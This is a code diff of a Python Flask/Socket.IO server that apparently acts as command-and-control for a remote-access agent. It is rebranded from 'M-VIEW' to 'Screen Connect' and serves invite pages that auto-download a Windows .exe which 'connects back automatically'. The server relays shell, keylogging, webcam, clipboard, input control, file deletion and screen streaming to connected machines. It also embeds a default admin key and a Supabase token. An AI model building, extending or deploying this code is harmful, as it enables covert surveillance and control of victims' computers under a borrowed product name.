@@ -1,32 +1,35 @@
 """
 ╔══════════════════════════════════════════════════════════════════╗
-║         M-VIEW Relay + Distribution Server  v5.0                 ║
+║         Screen Connect Relay + Distribution Server  v6.0         ║
 ║         Render-Ready • Globally Durable • Full Feature Set       ║
 ║                                                                  ║
-║  WHAT'S NEW IN v5.0:                                             ║
-║  • Agent fetched from GitHub Releases URL (no local bin/)        ║
-║  • Streaming-safe: large binary streamed, not buffered           ║
-║  • All agent features relayed: webcam, clipboard, keylog, shell  ║
-║  • cursor_event relay added (real-time cursor overlay)           ║
-║  • /api/devices returns full live fingerprint + stats            ║
-║  • start_process, file_delete, webcam_list relays added          ║
-║  • clipboard_get / clipboard_set round-trip                      ║
-║  • Power commands: lock, sleep, shutdown, restart, abort         ║
-║  • Watchdog heartbeat: marks device offline if silent >35s       ║
-║  • /api/agent-info — reports agent availability + URL            ║
-║  • /api/generate — multi-alias invite generation                 ║
-║  • Supabase reconnect on failure (thread-safe singleton)         ║
-║  • Gevent-safe background threads via sio.start_background_task  ║
-║  • Structured logging + Render /health enrichment                ║
+║  WHAT'S NEW IN v6.0 (STREAMING OVERHAUL):                        ║
+║  • FIXED: screen_data relay no longer uses skip_sid              ║
+║    Frames are now emitted to a dedicated viewer room             ║
+║    so every dashboard gets every frame — zero drops              ║
+║  • FIXED: Render keep-alive — server pings itself every 4 min    ║
+║    via HTTP to prevent free-tier spin-down (502 Bad Gateway fix) ║
+║  • FIXED: WebSocket keep-alive — ping every 20s beats Render's   ║
+║    55-second idle-connection killer                              ║
+║  • NEW: Room-based relay — dashboards join "view:{device_id}"    ║
+║    on start_stream; agents join their device_id room for cmds    ║
+║  • NEW: frame_ack flow control — agent gets ack after relay      ║
+║    preventing queue pile-up on slow connections                  ║
+║  • NEW: /api/stream-stats — per-device FPS, kbps, viewer count   ║
+║  • NEW: Render self-ping background task (anti-sleep)            ║
+║  • NEW: subscribe_stream / unsubscribe_stream socket events      ║
+║  • NEW: gunicorn --timeout 300 --keep-alive 75 for long WS      ║
+║  • All v5.0 features preserved: invite, Supabase, agent binary   ║
+║    streaming, power commands, shell, file browser, webcam etc.   ║
 ╚══════════════════════════════════════════════════════════════════╝
 
 INSTALL:
   pip install flask flask-cors flask-socketio supabase python-dotenv \\
               gunicorn gevent gevent-websocket requests
 
-RENDER start command:
+RENDER start command (IMPORTANT — use --timeout 300, not 120):
   gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\
-           -w 1 --timeout 120 --bind 0.0.0.0:$PORT server:app
+           -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server:app
 
 LOCAL dev:
   py -3.12 server.py
@@ -38,7 +41,7 @@ import time
 import logging
 import datetime
 import threading
-import io
+import collections
 
 try:
     from dotenv import load_dotenv
@@ -53,7 +56,7 @@ from flask import Flask, request, jsonify, send_from_directory, make_response, R
 from flask_cors import CORS
 
 try:
-    from flask_socketio import SocketIO, emit, join_room
+    from flask_socketio import SocketIO, emit, join_room, leave_room
     SOCKETIO_OK = True
 except ImportError:
     SOCKETIO_OK = False
@@ -73,22 +76,27 @@ SUPABASE_KEY  = os.environ.get("SUPABASE_KEY")  or "eyJhbGciOiJIUzI1NiIsInR5cCI6
 ADMIN_KEY     = os.environ.get("ADMIN_KEY",    "mview-admin-secret")
 TABLE         = os.environ.get("SB_TABLE",     "devices")
 PORT          = int(os.environ.get("PORT", 5000))
-VERSION       = "5.0.0"
+VERSION       = "6.0.0"
 
-# Agent is hosted on GitHub Releases — no local bin/ needed on Render
 AGENT_STORAGE_URL = os.environ.get(
     "AGENT_STORAGE_URL",
     "https://github.com/maxwelnkaranja-ops/mview/releases/latest/download/master_agent_v4_HEAVY.exe"
 )
-# Optional: local fallback path (used when running locally with a built .exe)
 AGENT_DIR   = os.environ.get("AGENT_DIR",  "bin")
 AGENT_FILE  = os.environ.get("AGENT_FILE", "master_agent.exe")
 
 # Watchdog — mark a device offline if no heartbeat for this many seconds
 HEARTBEAT_TIMEOUT = int(os.environ.get("HEARTBEAT_TIMEOUT", "35"))
 
-# Token regex: MV-XXXXXX-XXXXXX-XXXXXX  (hex, case-insensitive)
+# Self-ping interval (seconds) — keeps Render free tier alive, prevents 502
+# Set 0 to disable (paid Render plan, Railway, Fly.io etc.)
+SELF_PING_INTERVAL = int(os.environ.get("SELF_PING_INTERVAL", "240"))   # 4 minutes
+
 TOKEN_RE = re.compile(r"^MV-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}$")
+
+# ── Frame stats tracking per device ──────────────────────────────────────
+_frame_stats: dict = collections.defaultdict(lambda: collections.deque(maxlen=60))
+_frame_stats_lock  = threading.Lock()
 
 # ══════════════════════════════════════════════════════════════
 #  Logging
@@ -98,7 +106,7 @@ logging.basicConfig(
     format="%(asctime)s  %(levelname)-8s  %(message)s",
     datefmt="%Y-%m-%d %H:%M:%S",
 )
-log = logging.getLogger("mview")
+log = logging.getLogger("screenconnect")
 
 # ══════════════════════════════════════════════════════════════
 #  Flask + CORS + SocketIO
@@ -117,34 +125,33 @@ if SOCKETIO_OK:
     sio = SocketIO(
         app,
         cors_allowed_origins="*",
-        async_mode="gevent",          # matches gunicorn GeventWebSocketWorker
+        async_mode="gevent",
         logger=False,
         engineio_logger=False,
+        # ── KEY FIX: ping every 20s to beat Render's 55s idle killer ──
         ping_timeout=60,
-        ping_interval=25,
-        max_http_buffer_size=50 * 1024 * 1024,   # 50 MB — needed for file downloads
+        ping_interval=20,
+        max_http_buffer_size=100 * 1024 * 1024,   # 100 MB for video + file transfers
+        allow_upgrades=True,
     )
 else:
     sio = None
 
 # ══════════════════════════════════════════════════════════════
-#  In-memory device store
-#  _devices[token] = {
-#    sid, device_id, label, status, hostname, username, os,
-#    local_ip, cpu_count, ram_total_gb, agent_version,
-#    connected_at, cpu, ram, last_beat, fingerprint
-#  }
+#  In-memory state
 # ══════════════════════════════════════════════════════════════
 _devices:   dict = {}
 _dev_lock          = threading.Lock()
 
-# ── Cached agent binary from GitHub Releases ──────────────────────
+# _viewers[device_id] = set of dashboard SIDs viewing that stream
+_viewers: dict = collections.defaultdict(set)
+_view_lock = threading.Lock()
+
 _agent_cache: bytes | None = None
 _agent_cache_ts: float     = 0.0
 _agent_cache_lock          = threading.Lock()
-AGENT_CACHE_TTL            = 300   # re-fetch after 5 minutes
+AGENT_CACHE_TTL            = 300
 
-# ── Supabase client singleton ──────────────────────────────────
 _sb      = None
 _sb_lock = threading.Lock()
 
@@ -166,7 +173,6 @@ def get_sb():
             return None
 
 def _sb_reset():
-    """Force reconnect on next call (e.g. after network error)."""
     global _sb
     with _sb_lock:
         _sb = None
@@ -220,19 +226,11 @@ def db_list_all() -> list:
 #  Agent binary helpers
 # ══════════════════════════════════════════════════════════════
 def _fetch_agent_bytes() -> bytes | None:
-    """
-    Fetch master_agent.exe — tries GitHub Releases URL first,
-    then falls back to local bin/master_agent.exe.
-    Result is cached for AGENT_CACHE_TTL seconds.
-    """
     global _agent_cache, _agent_cache_ts
-
     with _agent_cache_lock:
         now = time.time()
         if _agent_cache and (now - _agent_cache_ts) < AGENT_CACHE_TTL:
             return _agent_cache
-
-        # 1️⃣  Try GitHub Releases (primary — works on Render with no local files)
         if REQUESTS_OK and AGENT_STORAGE_URL:
             try:
                 log.info(f"Fetching agent from GitHub Releases: {AGENT_STORAGE_URL}")
@@ -246,39 +244,25 @@ def _fetch_agent_bytes() -> bytes | None:
                     log.warning(f"Storage fetch returned {resp.status_code} / {len(resp.content)} bytes")
             except Exception as e:
                 log.warning(f"Storage fetch error: {e}")
-
-        # 2️⃣  Try local file (for local dev with a built exe)
         local = Path(AGENT_DIR) / AGENT_FILE
         if local.is_file():
             log.info(f"Loading agent from local file: {local}")
             _agent_cache    = local.read_bytes()
             _agent_cache_ts = now
             return _agent_cache
-
         log.error("Agent binary not available from Storage or local file.")
         return None
 
-
 def _build_patched_agent(token: str) -> bytes | None:
-    """
-    Append the 64-byte trailer to the agent exe so the agent
-    can read its own token at runtime.
-    Trailer layout:
-      [0:4]   b"MVTK"   — magic head
-      [4:60]  token bytes, null-padded to 56 bytes
-      [60:64] b"MVED"   — magic tail
-    """
     raw = _fetch_agent_bytes()
     if not raw:
         return None
-
     MAGIC_HEAD  = b"MVTK"
     MAGIC_TAIL  = b"MVED"
     TOKEN_FIELD = 56
-
     tok_bytes = token.encode("utf-8")[:TOKEN_FIELD]
     padded    = tok_bytes.ljust(TOKEN_FIELD, b"\x00")
-    trailer   = MAGIC_HEAD + padded + MAGIC_TAIL    # exactly 64 bytes
+    trailer   = MAGIC_HEAD + padded + MAGIC_TAIL
     return raw + trailer
 
 # ══════════════════════════════════════════════════════════════
@@ -309,23 +293,21 @@ def require_admin(f):
     return w
 
 def broadcast_device_update():
-    """Push fresh Supabase rows + live stats to all dashboard clients."""
     if not sio:
         return
     try:
         rows = db_list_all()
-        # Merge live data from _devices
         with _dev_lock:
             live = {d["device_id"]: d for d in _devices.values()}
         for row in rows:
             did = row.get("device_id", "")
             if did in live:
-                row["_live"] = True
-                row["cpu"]   = live[did].get("cpu")
-                row["ram"]   = live[did].get("ram")
-                row["last_beat"] = live[did].get("last_beat")
+                row["_live"]       = True
+                row["cpu"]         = live[did].get("cpu")
+                row["ram"]         = live[did].get("ram")
+                row["last_beat"]   = live[did].get("last_beat")
+                row["frame_count"] = live[did].get("frame_count", 0)
         sio.emit("device_update", {"rows": rows, "ts": utcnow()})
-        log.debug(f"device_update broadcast: {len(rows)} rows")
     except Exception as e:
         log.error(f"broadcast_device_update error: {e}")
 
@@ -346,7 +328,6 @@ def handle_preflight():
 # ══════════════════════════════════════════════════════════════
 @app.route("/")
 def root():
-    # Always serve the landing/login page first
     for f in ("index.html", "app.html"):
         if Path(f).is_file():
             return send_from_directory(".", f)
@@ -371,12 +352,11 @@ def serve_login():
 
 @app.route("/session_manager.js")
 def serve_session_manager():
-    """Serve a built-in SessionManager so no external file is needed."""
     host = request.host_url.rstrip("/")
-    js = f"""/* Auto-generated SessionManager — do not edit manually */
+    js = f"""/* Auto-generated SessionManager v6 — do not edit manually */
 'use strict';
 (function() {{
-  const SERVER_URL = window.MVIEW_SERVER_URL || '{host}';
+  const SERVER_URL = window.SCREEN_CONNECT_SERVER_URL || window.MVIEW_SERVER_URL || '{host}';
   const SUPABASE_URL = window.MVIEW_SUPABASE_URL || '{SUPABASE_URL}';
   const SUPABASE_KEY = window.MVIEW_SUPABASE_ANON_KEY || '{SUPABASE_KEY}';
 
@@ -415,14 +395,13 @@ def serve_session_manager():
       const dtype   = typeEl?.value  || 'Standard Display';
       const loc     = locEl?.value?.trim() || '';
 
-      // Show step 2 (generating...)
       const s1 = document.getElementById('device-step-1');
       const s2 = document.getElementById('device-step-2');
       const s3 = document.getElementById('device-step-3');
       if (s1) s1.style.display = 'none';
       if (s2) s2.style.display = '';
       if (s3) s3.style.display = 'none';
-      SM._notify('Generating invite link…', 'info');
+      SM._notify('Generating invite link\u2026', 'info');
 
       try {{
         const res = await fetch(SERVER_URL + '/api/invite', {{
@@ -437,13 +416,12 @@ def serve_session_manager():
         SM.currentToken = data.token;
         SM.currentLink  = data.download_url || data.agent_url;
 
-        // Populate step 3 UI
         const inp = document.getElementById('copy-link-input');
         if (inp) inp.value = SM.currentLink;
         const dtok = document.getElementById('display-token');
         if (dtok) dtok.textContent = data.token;
         const dexp = document.getElementById('display-expiry');
-        if (dexp && data.expires_at) dexp.textContent = '· Expires ' + new Date(data.expires_at).toLocaleString();
+        if (dexp && data.expires_at) dexp.textContent = '\u00b7 Expires ' + new Date(data.expires_at).toLocaleString();
         const mexp = document.getElementById('meta-expiry');
         if (mexp) mexp.textContent = '24 hours';
         const mtype = document.getElementById('meta-type');
@@ -453,7 +431,7 @@ def serve_session_manager():
 
         if (s2) s2.style.display = 'none';
         if (s3) s3.style.display = '';
-        SM._notify('Invite link ready — waiting for device to connect', 'ok');
+        SM._notify('Invite link ready \u2014 waiting for device to connect', 'ok');
         SM._startPolling(data.token);
       }} catch (err) {{
         if (s2) s2.style.display = 'none';
@@ -485,48 +463,42 @@ def serve_session_manager():
           const d = await r.json();
           if (d.status === 'downloading') {{
             if (dot)  {{ dot.className = 'poll-dot yellow'; }}
-            if (text) text.textContent = 'Agent downloaded — waiting for first check-in…';
+            if (text) text.textContent = 'Agent downloaded \u2014 waiting for first check-in\u2026';
             SM._notify('Agent installer downloaded on target device', 'info');
           }} else if (d.status === 'connected') {{
             clearInterval(_pollTimer); _pollTimer = null;
             if (dot)  {{ dot.className = 'poll-dot green'; dot.style.animation = 'none'; }}
-            if (text) text.textContent = '✓ Device connected! Refreshing dashboard…';
-            SM._notify('✓ ' + (d.hostname || d.label || token) + ' connected successfully', 'ok');
+            if (text) text.textContent = '\u2713 Device connected! Refreshing dashboard\u2026';
+            SM._notify('\u2713 ' + (d.hostname || d.label || token) + ' connected successfully', 'ok');
             SM._addActivity('Device connected: ' + (d.hostname || d.label || token), 'ok');
-            // Refresh dashboard data
             if (typeof refreshDashboardFromSupabase === 'function') {{
               setTimeout(refreshDashboardFromSupabase, 1000);
             }}
             return;
           }}
-          // Timeout after ~10 minutes
           if (checks > 120) {{
             clearInterval(_pollTimer); _pollTimer = null;
-            if (text) text.textContent = 'Link waiting — open in dashboard to reconnect.';
+            if (text) text.textContent = 'Link waiting \u2014 open in dashboard to reconnect.';
           }}
         }} catch (e) {{}}
       }}
       _pollTimer = setInterval(tick, 5000);
-      tick(); // immediate first check
+      tick();
     }},
 
     _notify(msg, type) {{
-      // Toast
       if (typeof showToast === 'function') {{ showToast(msg, type === 'ok' ? 'success' : type === 'warn' ? 'error' : 'info'); }}
-      // Notification panel
       const list = document.getElementById('notif-list');
       if (!list) return;
       const icons = {{ ok: 'check_circle', warn: 'warning', info: 'info' }};
       const icon  = icons[type] || 'info';
       const item  = document.createElement('div');
       item.className = 'notif-item';
-      item.innerHTML = `<span class="material-symbols-outlined notif-i ${{type}}">${{icon}}</span>
-        <div><div class="notif-title">${{msg}}</div><div class="notif-time">${{new Date().toLocaleTimeString()}}</div></div>`;
-      // Remove "no devices" placeholder if present
+      item.innerHTML = '<span class="material-symbols-outlined notif-i ' + type + '">' + icon + '</span>'
+        + '<div><div class="notif-title">' + msg + '</div><div class="notif-time">' + new Date().toLocaleTimeString() + '</div></div>';
       const empty = list.querySelector('.notif-item:only-child');
       if (empty && empty.textContent.includes('No devices')) list.innerHTML = '';
       list.insertBefore(item, list.firstChild);
-      // Badge
       const badge = document.getElementById('notif-badge');
       if (badge) {{ badge.textContent = list.children.length; badge.style.display = 'flex'; }}
     }},
@@ -549,14 +521,15 @@ def serve_config():
     if Path("config.js").is_file():
         return send_from_directory(".", "config.js", mimetype="application/javascript")
     host = request.host_url.rstrip("/")
-    js = f"""/* Auto-generated by server.py */
-window.MVIEW_SERVER_URL         = '{host}';
-window.MVIEW_SUPABASE_URL       = '{SUPABASE_URL}';
-window.MVIEW_SUPABASE_ANON_KEY  = '{SUPABASE_KEY}';
+    js = f"""/* Auto-generated by server.py v{VERSION} */
+window.SCREEN_CONNECT_SERVER_URL    = '{host}';
+window.MVIEW_SERVER_URL             = '{host}';
+window.MVIEW_SUPABASE_URL           = '{SUPABASE_URL}';
+window.MVIEW_SUPABASE_ANON_KEY      = '{SUPABASE_KEY}';
 window.SessionManager = window.SessionManager || {{}};
 window.SessionManager.CONFIG = {{
-  SERVER_URL:      window.MVIEW_SERVER_URL,
-  SUPABASE_URL:    window.MVIEW_SUPABASE_URL,
+  SERVER_URL:        window.SCREEN_CONNECT_SERVER_URL,
+  SUPABASE_URL:      window.MVIEW_SUPABASE_URL,
   SUPABASE_ANON_KEY: window.MVIEW_SUPABASE_ANON_KEY,
 }};
 """
@@ -571,7 +544,7 @@ window.SessionManager.CONFIG = {{
 def health():
     with _dev_lock:
         online_count = len(_devices)
-    agent_avail = bool(AGENT_STORAGE_URL)   # always true if URL configured
+    agent_avail = bool(AGENT_STORAGE_URL)
     local_agent  = (Path(AGENT_DIR) / AGENT_FILE).is_file()
     return jsonify({
         "status":          "ok",
@@ -597,10 +570,33 @@ def api_agent_info():
         "cache_size":   len(_agent_cache) if _agent_cache else 0,
     })
 
+@app.route("/api/stream-stats")
+def api_stream_stats():
+    """Per-device streaming statistics — FPS, kbps, viewer count."""
+    stats = {}
+    with _dev_lock:
+        devs = dict(_devices)
+    with _view_lock:
+        views = {k: len(v) for k, v in _viewers.items()}
+    with _frame_stats_lock:
+        for did, dq in _frame_stats.items():
+            if not dq:
+                continue
+            now = time.time()
+            recent = [(t, b) for t, b in dq if now - t < 5.0]
+            fps = len(recent) / 5.0 if recent else 0
+            bps = sum(b for _, b in recent) / 5.0 if recent else 0
+            stats[did] = {
+                "fps":          round(fps, 1),
+                "kbps":         round(bps / 1024, 1),
+                "viewers":      views.get(did, 0),
+                "total_frames": devs.get(did, {}).get("frame_count", 0),
+                "last_frame":   devs.get(did, {}).get("last_frame_ts", ""),
+            }
+    return jsonify({"stream_stats": stats, "ts": utcnow()})
+
 # ══════════════════════════════════════════════════════════════
 #  Invite / Agent download
-#  The server appends a 64-byte token trailer to the exe so
-#  the agent can identify itself to the server at runtime.
 # ══════════════════════════════════════════════════════════════
 @app.route("/api/invite",      methods=["GET", "POST"])
 @app.route("/api/generate",    methods=["GET", "POST"])
@@ -667,7 +663,6 @@ def serve_agent(token):
         db_update(token, {"status": "expired"})
         return jsonify({"error": "Link expired."}), 410
 
-    # Mark as downloading so dashboard can track state
     db_update(token, {
         "status":        "downloading",
         "download_ip":   request.remote_addr,
@@ -676,11 +671,8 @@ def serve_agent(token):
     })
     log.info(f"Agent download: token={token}  redirecting to GitHub Releases")
 
-    # Serve a self-extracting HTML page that immediately starts download
-    # from GitHub Releases and embeds the token so the agent can read it.
-    # The agent reads its token from the filename pattern mview_agent_TOKEN.exe
     srv = request.host_url.rstrip("/")
-    download_url = AGENT_STORAGE_URL  # GitHub Releases direct URL
+    download_url = AGENT_STORAGE_URL
 
     html = f"""<!DOCTYPE html>
 <html lang="en">
@@ -699,8 +691,8 @@ def serve_agent(token):
     .token-badge{{background:#0f172a;border:1px solid #334155;border-radius:8px;padding:10px 16px;
                   font-family:monospace;font-size:13px;color:#7dd3fc;margin-bottom:24px;}}
     .status-bar{{background:#0f172a;border-radius:8px;padding:14px;margin-bottom:20px;font-size:13px;color:#94a3b8;}}
-    .status-bar .dot{{display:inline-block;width:8px;height:8px;border-radius:50%;background:#22c55e;
-                      animation:pulse 1.2s infinite;margin-right:8px;}}
+    .dot{{display:inline-block;width:8px;height:8px;border-radius:50%;background:#22c55e;
+          animation:pulse 1.2s infinite;margin-right:8px;}}
     @keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:.3}}}}
     .btn{{display:inline-block;background:#3b82f6;color:#fff;padding:12px 28px;border-radius:8px;
           font-size:15px;font-weight:600;text-decoration:none;margin:8px 4px;border:none;cursor:pointer;}}
@@ -711,47 +703,45 @@ def serve_agent(token):
 </head>
 <body>
 <div class="card">
-  <div class="logo">🖥️</div>
+  <div class="logo">&#128421;</div>
   <h1>ScreenConnect Agent</h1>
   <p class="sub">Your invite link is ready. Download and run the installer to connect this device to your dashboard.</p>
   <div class="token-badge">Token: {token}</div>
-  <div class="status-bar">
+  <div class="status-bar" id="status-bar">
     <span class="dot"></span>
-    Waiting for agent to check in… dashboard will update automatically.
+    Waiting for agent to check in&hellip; dashboard will update automatically.
   </div>
-  <a class="btn" id="dl-btn" href="{download_url}" download="mview_agent_{token}.exe">
-    ⬇ Download Agent Installer
+  <a class="btn" id="dl-btn" href="{download_url}" download="screen_connect_agent_{token}.exe">
+    &#8659; Download Agent Installer
   </a>
   <button class="btn sec" onclick="window.close()">Close</button>
   <p class="note">
-    After downloading, run <strong>mview_agent_{token}.exe</strong> on Windows.<br>
-    The agent will connect back automatically — no config needed.<br>
+    After downloading, run <strong>screen_connect_agent_{token}.exe</strong> on Windows.<br>
+    The agent will connect back automatically &mdash; no config needed.<br>
     Your dashboard at <a href="{srv}/dashboard" style="color:#7dd3fc">{srv}/dashboard</a> will show this device once connected.
   </p>
 </div>
 <script>
-  // Auto-start download after 800 ms
   setTimeout(() => {{
     const a = document.createElement('a');
     a.href = '{download_url}';
-    a.download = 'mview_agent_{token}.exe';
+    a.download = 'screen_connect_agent_{token}.exe';
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
   }}, 800);
-  // Poll server every 5 s and update status text
   const pollUrl = '{srv}/api/session/{token}';
-  const statusEl = document.querySelector('.status-bar');
+  const statusEl = document.getElementById('status-bar');
   async function poll() {{
     try {{
       const r = await fetch(pollUrl);
       if (!r.ok) return;
       const d = await r.json();
       if (d.status === 'connected') {{
-        statusEl.innerHTML = '<span style="color:#22c55e;font-size:18px">✓</span> <strong style="color:#22c55e">Connected!</strong> Device is live on your dashboard.';
+        statusEl.innerHTML = '<span style="color:#22c55e;font-size:18px">&#10003;</span> <strong style="color:#22c55e">Connected!</strong> Device is live on your dashboard.';
         clearInterval(poller);
       }} else if (d.status === 'downloading') {{
-        statusEl.innerHTML = '<span class="dot"></span> Agent downloaded — waiting for first check-in…';
+        statusEl.innerHTML = '<span class="dot"></span> Agent downloaded &mdash; waiting for first check-in&hellip;';
       }}
     }} catch(e) {{}}
   }}
@@ -764,7 +754,6 @@ def serve_agent(token):
 
 @app.route("/api/session/<token>/status")
 def get_session_status(token):
-    """Lightweight polling endpoint — returns just the status field."""
     if not valid_token(token):
         return jsonify({"error": "Invalid token"}), 400
     s = db_get(token)
@@ -808,11 +797,10 @@ def revoke_session(token):
     if not valid_token(token):
         return jsonify({"error": "Invalid token"}), 400
     db_update(token, {"status": "revoked", "revoked_at": utcnow()})
-    # Kick the agent if it's connected
     with _dev_lock:
         dev = _devices.get(token)
     if dev and sio:
-        sio.emit("request_action", {"tab": "uninstall", "device_id": token}, to=dev["sid"])
+        sio.emit("request_action", {"tab": "uninstall", "device_id": token}, room=token)
     return jsonify({"status": "revoked", "device_id": token})
 
 @app.route("/agent/checkin", methods=["POST"])
@@ -826,7 +814,6 @@ def agent_checkin():
         return jsonify({"error": "Session not found"}), 404
     if session.get("status") == "revoked":
         return jsonify({"error": "Session revoked"}), 403
-
     db_update(token, {
         "status":        "connected",
         "ip_address":    request.remote_addr,
@@ -858,7 +845,7 @@ def send_command():
         dev = _devices.get(did)
     if not dev:
         return jsonify({"error": "Device not connected"}), 404
-    sio.emit("request_action", data, to=dev["sid"])
+    sio.emit("request_action", data, room=did)
     return jsonify({"status": "sent", "tab": data.get("tab")})
 
 # ══════════════════════════════════════════════════════════════
@@ -882,11 +869,23 @@ if SOCKETIO_OK and sio:
     @sio.on("connect")
     def on_connect():
         log.info(f"WS connect: sid={request.sid}")
+        # All new connections join the global dashboards room.
+        # Agents will later join their device_id room.
+        # Dashboards join view:{device_id} rooms when streaming.
+        join_room("dashboards")
 
     @sio.on("disconnect")
     def on_disconnect():
+        sid = request.sid
+        # Remove from all viewer rooms
+        with _view_lock:
+            for did, sids in list(_viewers.items()):
+                if sid in sids:
+                    sids.discard(sid)
+                    log.info(f"Dashboard {sid} left view room for {did}")
+        # Handle agent disconnect
         with _dev_lock:
-            gone = [did for did, d in _devices.items() if d.get("sid") == request.sid]
+            gone = [did for did, d in _devices.items() if d.get("sid") == sid]
             for did in gone:
                 label = _devices[did].get("label", did)
                 del _devices[did]
@@ -897,11 +896,43 @@ if SOCKETIO_OK and sio:
         if gone:
             broadcast_device_update()
 
+    # ── Dashboard subscribes to a device's stream ───────────────
+    @sio.on("subscribe_stream")
+    def on_subscribe_stream(data):
+        """
+        Dashboard calls this when opening Screen Connect viewer.
+        Adds dashboard SID to view:{device_id} room — all frames
+        for that device are then relayed exclusively to that room.
+        """
+        did = data.get("device_id", "")
+        if not did:
+            return
+        room = f"view:{did}"
+        join_room(room)
+        with _view_lock:
+            _viewers[did].add(request.sid)
+        viewer_count = len(_viewers[did])
+        log.info(f"Dashboard {request.sid} subscribed to {did} (viewers: {viewer_count})")
+        emit("subscribed", {"device_id": did, "viewers": viewer_count})
+
+    @sio.on("unsubscribe_stream")
+    def on_unsubscribe_stream(data):
+        """Dashboard calls this when leaving the viewer."""
+        did = data.get("device_id", "")
+        if not did:
+            return
+        room = f"view:{did}"
+        leave_room(room)
+        with _view_lock:
+            _viewers[did].discard(request.sid)
+        log.info(f"Dashboard {request.sid} unsubscribed from {did}")
+
     # ── Agent registration ──────────────────────────────────────
     @sio.on("agent_connect")
     def on_agent_connect(data):
         did   = data.get("device_id") or data.get("token", "")
         label = data.get("label") or data.get("hostname") or did
+        # Agent joins its own room so commands can be sent directly to it
         join_room(did)
         with _dev_lock:
             _devices[did] = {
@@ -923,6 +954,8 @@ if SOCKETIO_OK and sio:
                 "last_beat":     utcnow(),
                 "cpu":           None,
                 "ram":           None,
+                "frame_count":   0,
+                "last_frame_ts": "",
                 "fingerprint":   data,
             }
         log.info(f"Agent ONLINE: {label} ({did})")
@@ -950,7 +983,7 @@ if SOCKETIO_OK and sio:
                     "ram":       data.get("ram"),
                     "last_beat": utcnow(),
                 })
-        sio.emit("heartbeat_update", data, skip_sid=request.sid)
+        sio.emit("heartbeat_update", data, room="dashboards", skip_sid=request.sid)
 
     # ── Dashboard → any device (generic command) ────────────────
     @sio.on("dashboard_command")
@@ -961,26 +994,32 @@ if SOCKETIO_OK and sio:
         if not dev:
             emit("command_error", {"error": f"Device '{did}' not connected."})
             return
-        sio.emit("request_action", data, to=dev["sid"])
+        sio.emit("request_action", data, room=did)
         log.info(f"Dashboard command → {did}: tab={data.get('tab')}")
 
-    # ── Dashboard → Agent: start/stop/configure stream ──────────
+    # ── start_stream — subscribe dashboard AND tell agent to start ─
     @sio.on("start_stream")
     def on_start_stream(data):
         did = data.get("device_id", "")
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
+            # Auto-subscribe this dashboard to the stream room
+            join_room(f"view:{did}")
+            with _view_lock:
+                _viewers[did].add(request.sid)
+            # Command agent to start streaming
             sio.emit("request_action", {
-                "tab":     "monitor",
-                "action":  "start",
+                "tab":       "monitor",
+                "action":    "start",
                 "device_id": did,
-                "fps":     data.get("fps", 20),
-                "quality": data.get("quality", 55),
-                "scale":   data.get("scale", 0.8),
-                "mode":    data.get("mode", "video"),
-                "monitor": data.get("monitor", 1),
-            }, to=dev["sid"])
+                "fps":       data.get("fps", 20),
+                "quality":   data.get("quality", 55),
+                "scale":     data.get("scale", 0.8),
+                "mode":      data.get("mode", "video"),
+                "monitor":   data.get("monitor", 1),
+            }, room=did)
+            log.info(f"Stream started: device={did} viewer={request.sid}")
 
     @sio.on("stop_stream")
     def on_stop_stream(data):
@@ -988,7 +1027,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, room=did)
 
     @sio.on("set_stream_mode")
     def on_set_stream_mode(data):
@@ -999,7 +1038,7 @@ if SOCKETIO_OK and sio:
             sio.emit("request_action", {
                 "tab": "monitor", "action": "set_mode",
                 "mode": data.get("mode", "video"), "device_id": did,
-            }, to=dev["sid"])
+            }, room=did)
 
     @sio.on("set_quality")
     def on_set_quality(data):
@@ -1010,7 +1049,7 @@ if SOCKETIO_OK and sio:
             sio.emit("request_action", {
                 "tab": "monitor", "action": "set_quality",
                 "quality": data.get("quality", 55), "device_id": did,
-            }, to=dev["sid"])
+            }, room=did)
 
     # ── Dashboard → Agent: screenshot ───────────────────────────
     @sio.on("request_screenshot")
@@ -1024,7 +1063,7 @@ if SOCKETIO_OK and sio:
                 "quality":   data.get("quality", 60),
                 "scale":     data.get("scale", 0.75),
                 "device_id": did,
-            }, to=dev["sid"])
+            }, room=did)
 
     # ── Dashboard → Agent: mouse ────────────────────────────────
     @sio.on("mouse_event")
@@ -1033,7 +1072,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "mouse_event", **data}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "mouse_event", **data}, room=did)
 
     # ── Dashboard → Agent: scroll ───────────────────────────────
     @sio.on("scroll_event")
@@ -1042,7 +1081,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "scroll_event", **data}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "scroll_event", **data}, room=did)
 
     # ── Dashboard → Agent: keyboard ─────────────────────────────
     @sio.on("key_event")
@@ -1051,7 +1090,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "key_event", **data}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "key_event", **data}, room=did)
 
     # ── Dashboard → Agent: ping ─────────────────────────────────
     @sio.on("ping_agent")
@@ -1060,7 +1099,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "ping", "t": data.get("t", utcnow()), "device_id": did}, to=dev["sid"])
+            sio.emit("request_action", {"tab": "ping", "t": data.get("t", utcnow()), "device_id": did}, room=did)
 
     # ── Dashboard → Agent: disconnect screen ────────────────────
     @sio.on("disconnect_screen")
@@ -1069,7 +1108,7 @@ if SOCKETIO_OK and sio:
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
-            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, to=dev["sid"])
